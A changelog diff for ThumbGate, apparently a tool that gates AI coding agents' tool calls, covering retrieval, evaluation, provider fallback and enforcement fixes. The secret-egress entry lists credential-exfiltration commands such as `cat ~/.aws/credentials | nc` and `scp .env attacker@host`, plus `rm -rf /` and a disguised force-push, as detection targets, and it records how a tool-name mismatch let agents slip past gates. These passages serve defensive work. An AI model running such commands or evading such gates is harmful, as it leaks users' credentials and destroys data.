@@ -1,5 +1,134 @@
 # Changelog
 
+## 1.31.0
+
+### Minor Changes
+
+- 2d2fd7a: Consolidate the feedback-to-enforcement, retrieval, evaluation, provider, and
+  production-control work behind one fail-closed A+ evidence contract.
+
+  The production PreToolUse path now runs BM25F, hashed ColBERT-style MaxSim, and
+  pairwise heuristic fusion with explicit provenance. The bounded offline suite
+  adds Recall@K, Precision@K, MRR, nDCG, faithfulness, groundedness, and answer
+  relevance regressions. Provider-neutral LLM routing, request envelopes, hard
+  cost/tier budgets, and stale/degraded retrieval flags make fallback state
+  observable.
+
+  The dashboard request envelope now evaluates prompt-safe input and decision audit
+  spans, and reports the final rerank score rather than the superseded first-stage
+  score.
+
+  `npm run score:a-plus` separates repository, deterministic-eval, provider,
+  production, security-review, and commercial proof. A+/10 is awarded only when
+  every evidence surface passes; missing live or buyer evidence fails closed.
+
+  The command-position evasion ratchet now also covers deterministic literal
+  substitutions such as `$(printf git) push --force` without executing arbitrary
+  shell during canonicalization.
+
+- 4066c5b: Make the advertised agent surface real, implement `gate_check`, and block credential exfiltration.
+
+  **`--agent` silently did nothing for two advertised agents.** README and `init --help` both offered `--agent opencode` and `--agent amp`; neither had a reachable handler. They fell through to hook wiring, which rejected them, printed the rejection as an ordinary log line, and exited 0 — while the auto-detect path wrote Claude/Codex/Gemini config so the run looked successful. `--agent opencode` and `--agent claude-code` produced byte-identical file sets. There is now a `SUPPORTED_AGENTS` registry, a real `setupOpenCode()`, and an unknown `--agent` exits 1 listing what is supported.
+
+  **`gate_check` did not exist.** `adapters/cline/.clinerules` has instructed agents to call `thumbgate.gate_check` since the adapter shipped, but `tools/list` returned 42 tools and none was it, so Cline enforcement was inert. Implemented over the same gates engine the PreToolUse hook uses and exposed in every MCP profile. It returns a distinct `warn` state (never `allow`) when a gate matched but warn-by-default posture downgraded it, so an agent is never told a flagged action is fine.
+
+  **Credential exfiltration is now blocked, not just credential reads.** The existing secret guard scans for secret material in the tool input — it catches `cat .env`, but missed every vector where the credential never appears literally in the command (`curl -d "$(cat .env)"`, `--data-binary @.env`, `curl -T ~/.ssh/id_rsa`, `cat ~/.aws/credentials | nc`, `echo $API_KEY | curl`, `base64 .env | curl`, `scp .env attacker@host`). The new `secret-egress` gate requires a credential source and an egress sink in the same command, and is ordered ahead of two broad warn gates that would otherwise swallow it under first-match-wins.
+
+  Also repins stale adapter versions (`claw`, `hermes`, `perplexity` were on 1.26.8 against a 1.30.0 package) with a drift test, and rewrites the README install table to state enforcement tier per agent — hard hook, advisory MCP, or feedback-only — including that advisory means the agent can ignore it.
+
+  Also normalizes harness tool vocabularies before gate evaluation. Cline's `.clinerules` gates `execute_command` / `write_to_file` / `replace_in_file`, while policy gates match `Bash` / `Write` / `Edit`; forwarding the harness name through unchanged meant `execute_command` + `rm -rf /` returned allow. `--agent claude` (a documented alias) is accepted again, and an unparseable OpenCode config is now preserved rather than overwritten.
+
+- 5f8b31d: Add evidence-grade RAG query transformation, reranking provenance, deterministic
+  answer-quality regressions, secret-safe LLM call tracing, fail-closed grounding,
+  hosted tenant data partitioning, and document-level authorization enforcement.
+- 2d2fd7a: Add an OpenAI-compatible gateway provider so LLM capabilities work without an Anthropic key.
+
+  Six runtime scripts gated on `ANTHROPIC_API_KEY` — `cross-encoder-reranker`, `eval-rag`, `self-distill-agent`, `secret-scanner`, `tool-registry`, `llm-client` — and every one degraded to heuristics **silently** when it was absent. `isAvailable()` was literally `Boolean(process.env.ANTHROPIC_API_KEY)`, so an operator paying for GLM or Kimi through a local gateway got the heuristic path with no indication the model tier was never consulted.
+
+  `llm-client` now falls back to any OpenAI-compatible endpoint (LiteLLM, vLLM, Ollama `/v1`, LM Studio) when no Anthropic client is available:
+
+  - `THUMBGATE_LLM_GATEWAY_URL` — enables the provider. Unset means no gateway; a published install never calls localhost because a port is open.
+  - `THUMBGATE_LLM_GATEWAY_MODEL` — defaults to `glm-5.2`.
+  - `THUMBGATE_LLM_GATEWAY_TOKEN` — optional; local gateways usually need none. Read at call time, never retained.
+
+  `describeInferenceAvailability()` reports **which** provider is live (`anthropic` / `gateway` / `none`, with a reason), so callers can report an honest scoring mode instead of inferring from a key's presence.
+
+  **Reasoning-model handling.** Models like GLM and Kimi split the response: `reasoning_content` holds the scratchpad, `content` holds the answer. Two empty-content cases that must not be conflated:
+
+  - `finish_reason: 'length'` — truncated mid-reasoning, the answer does not exist yet. Returns `null` so the caller falls back deterministically. Returning the scratchpad here would hand it confident-looking garbage.
+  - `finish_reason: 'stop'` — the model finished but emitted everything in the reasoning channel; that text is the answer.
+
+  Verified live against a LiteLLM gateway: `glm-5.2` returned `[0.9, 0.1]` for a relevance-scoring prompt (71 tokens, 23 cached), and the truncated variant correctly returned `null`.
+
+  No new dependency — the gateway contract is a single POST, and a security product's runtime needs a better reason than convenience to grow its supply chain.
+
+### Patch Changes
+
+- 8b3a515: Make auto-promoted gates actually enforce: group and match only by executable actions (not tag co-counts), derive command patterns, skip unmatchable/prose-only feedback, exclude originating incidents from regression quarantine, and prove capture→promote→deny end-to-end including the entity-tag failure class. Demo proves ALLOW → 3× 👎 → auto-promote → DENY.
+- cf386d4: Antithesis-inspired autonomous reliability explorer: high-ROI invariants (force-push, rm -rf, secrets, audit), fault injection, deterministic seed/replay, prove:reliability CI lane, self-heal check, and findings→feedback/memory promotion. Also fixes circular tool-input crashes in audit-trail during gate evaluation.
+- f724721: Ratchet against capability modules that ship with no caller.
+
+  On 2026-07-31 three separate components turned out to be well-written, fully tested, named after a capability — and wired to nothing:
+
+  - `auto-promote-gates.js` promoted gates whose match pattern was a tag string, so they could never fire. The suite asserted promotion _happened_, never that the gate _enforced_.
+  - `judge-reward-function.js` (408 lines of LLM-as-a-Judge) has `buildCompositeReward` called only from its own test, and nothing injects a judge function — so its scoring mode is permanently `deterministic_only`.
+  - `cross-encoder-reranker.js` is named for a cross-encoder but is an LLM reranker gated on `ANTHROPIC_API_KEY`, silently falling back to heuristics when the key is absent.
+
+  Unit tests structurally cannot catch this: every one of those modules passes its own tests in isolation. The defect is the _absence of a caller_.
+
+  `tests/capability-wiring-ratchet.test.js` pins the count of orphan scripts — modules whose name appears nowhere in the tracked tree outside their own file and `tests/` — at the 2026-07-31 baseline of 19. The count may fall freely as dead code is wired or deleted; it cannot rise without a deliberate bump and a note. A second, narrower assertion keeps claim-bearing modules (`gates-engine`, `auto-promote-gates`, `lesson-retrieval`) reachable, since those are the ones the pitch assumes are running.
+
+  Matching is deliberately permissive — a require, an npm script, a workflow step, or a docs mention all count as a reference. The goal is finding modules with no reachable caller at all, not enforcing import hygiene, so false positives are unacceptable and false negatives are fine.
+
+- 8228ca4: Keep ordinary init and quick-start runs deterministic by configuring only the explicitly selected integration, avoiding package-registry probes in source checkouts, replacing shell-based executable discovery, and requiring explicit opt-in before invoking optional external agent plugin managers with argument-safe, bounded execution.
+- 273aa20: Declare the YAML parser used by the packaged API server as a production dependency so production-only installs can load the runtime without relying on a transitive development package.
+- 501c7b7: Back the public /evaluations page with verifiable artifacts: the machine-readable
+  risk-model report (evals/risk-model-report.json, with provenance) is checked in and
+  linked from the page, the route gets a regression test that boots the real server, and
+  docs/ML-EVALUATION.md gains three mermaid diagrams (eval pipeline, enforcement loop,
+  lift chart).
+- 2ff7eec: Add a source-backed FAR.AI comparison page that distinguishes frontier safety research from ThumbGate runtime enforcement, visualizes how research findings can become pre-action rules, and connects buyer-intent traffic to tracked install and workflow-hardening paths.
+- c80bcfd: Fix dashboard Active Gates stuck on "—" by returning gate counts from /v1/feedback/stats and painting them in renderStats on connect/live refresh.
+- 01a4426: Stop statusline-launched dashboard API servers from leaking detached child processes, keep project lesson stores stable and isolated, scope SQLite search to the selected feedback root, abstain on lesson queries with no topical evidence, and fail embedding health when IDs are missing, stale, or orphaned.
+- 035a1d3: Fix Glama/MCP registry install: ship server.json + glama.json + smithery.yaml with explicit `npx -y thumbgate serve` stdio start so indexers stop guessing `npm start` (HTTP API). Document the contract in README.
+- 4c9794c: Visual homepage overhaul: giant thumbs branding, before/after + self-improving loop diagrams, and a plain-English answer to “is it really self-improving?” (control layer, not model retrain).
+- 9cd85f8: README: add the MCP Toplist rank badge (community contribution by @chrstphe).
+- cf386d4: Pragmatic multi-stage hybrid retrieval (turbopuffer-inspired): attribute-aware first stage, optional dense multi-query + RRF, BM25 rerank, diversify, and continuous recall sampling — all local, no turbopuffer dependency.
+- 19fc800: Add prove:glama-mcp start-contract pin and self-heal check so Glama registry install regressions (missing serve args, npm start guess, expanded MCP profile default) fail closed before merge.
+- fbc2ad4: Pro checkout interstitial adds a nofollow direct Stripe Payment Link CTA so buyers who bounce on the email form can still open live checkout without a second server round-trip.
+- 2d2fd7a: Promote honesty/overclaim `How to avoid` lines into prevention rules (High-Priority Contracts) so CEO completion-claim contracts survive rule regen.
+- cf386d4: Production RAG stage contracts, document pipeline, structured chat output, and real IR ranking eval (Recall@k, MRR, nDCG) on the gate scoring stack with graded golden qrels.
+- bb6849d: Keep dashboard search responsive by bounding hidden chart work and preventing the paid-help overlay from covering dashboard controls. Make DPO export download the actual preference-pair records through the authenticated POST API.
+- 290a228: Make lesson and document retrieval honestly hybrid end to end: local semantic embeddings, metadata filters, bounded query expansion, weighted fusion, reranking, parent-child document hydration, embedding maintenance, and measured retrieval ablations.
+- 70ffdc4: Retry bounded transient network and server failures in post-deploy marketing-page verification while continuing to fail deterministic content-contract mismatches immediately.
+- 286c20e: Make risk-aware model routing executable with provider dispatch, prompt-free outcome telemetry, and fixed-model holdout evaluation while explicitly separating generation routing from LLM-as-a-Judge scoring and deprecating misleading MoE-style expert terminology.
+- 8ea2fbb: Upgrade Scale The Vibe live demo: sandboxed feedback dir, thumbs branding, ALLOW→👎→DENY learning beat via force-promote, honest auto-promote boundary, deterministic and allow-path proofs.
+
+  Also raises the public npm package file-count ratchet 401 → 405 after landing diagram assets.
+
+- 5638ee7: Harden secret-exfiltration PreToolUse detection for structural vectors (command substitution, curl @file path findings, pipe-to-network, scp/rsync, secret env vars) so the deny-by-default claim matches real coverage beyond literal secret scanners.
+- 914e688: Segment the pricing page by buyer value and scope, add a compact recovery-cost
+  equation, and attribute pricing telemetry to the selected offer and experiment.
+- 80cda45: Give captured feedback a graded quality score.
+
+  `judge-reward-function.js` was 408 lines with zero non-test callers: `buildCompositeReward` ran only from its own test file, and nothing injected a judge function, so it could never produce a number in production. Well-built, fully tested, wired to nothing.
+
+  `scoreFeedbackReward()` in `feedback-quality.js` now adapts a captured feedback entry into the reward sample shape and returns a graded score. `assessFeedbackActionability` already answered the binary question — is this promotable at all. This answers the graded one: how good is the correction the operator actually wrote.
+
+  Verified discrimination:
+
+  | feedback                                                                   | score | verdict               |
+  | -------------------------------------------------------------------------- | ----- | --------------------- |
+  | `be better next time`                                                      | 0.76  | fails required rubric |
+  | `run npm test and verify the sha before claiming green, see commit abc123` | 1.0   | passes                |
+  | `deployed the fix`                                                         | 0.364 | `deterministic_block` |
+
+  The third case is the rubric's safety dimension refusing a completion claim with no verification attached — the same contract CLAUDE.md enforces on the agent, now applied to captured lessons.
+
+  Deterministic by construction: no judge function is injected, so scoring is `deterministic_only` with no network call and no `ANTHROPIC_API_KEY` dependency. That is deliberate — six runtime scripts already gate on that key, and a scorer that silently degrades to nothing when it is absent is worse than one that never claimed the LLM path.
+
+  Reporting only. Nothing here gates promotion; wiring a new quality signal into enforcement would change which lessons become blocking rules, and that belongs in its own change with its own evidence.
+
 ## 1.30.0
 
 ### Minor Changes
